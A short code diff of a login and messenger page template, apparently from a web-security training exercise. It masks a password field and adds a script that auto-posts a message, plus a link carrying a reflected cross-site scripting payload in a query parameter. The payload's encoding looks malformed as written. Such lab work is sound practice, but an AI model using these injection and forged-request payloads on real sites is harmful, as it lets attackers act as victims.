@@ -37,7 +37,7 @@
     {{#unless user}}
     <form method="post" class="form-inline" style="margin-top: 10px">
       Username: <input type="text" name="username">
-      Password: <input type="text" name="password">
+      Password: <input type="password" name="password">
       <input type="submit" value="Login">
     </form>
     {{else}}
@@ -50,4 +50,23 @@
 </div>
 
 <script>
+  $.ajax('/exercise2/messenger?success=Sent!', {
+    method: 'post',
+    data: {
+      to: "asfdljqew;riuio;fugfsdjlkfhiad;fgfjas;jkflda",
+      body: "Hey there big boi"
+    }
+  })
 </script>
+
+<a href="http://steal-this-app-horizons.herokuapp.com/exercise2/messenger?success=
+encodeURIComponent('<script>
+  $.ajax('/exercise2/messenger', {
+    method: 'post',
+    data: {
+      to: "asfdljqew;riuio;fugfsdjlkfhiad;fgfjas;jkflda",
+      body: "Hey big boi"
+    }
+  })
+</script>')
+"></a>
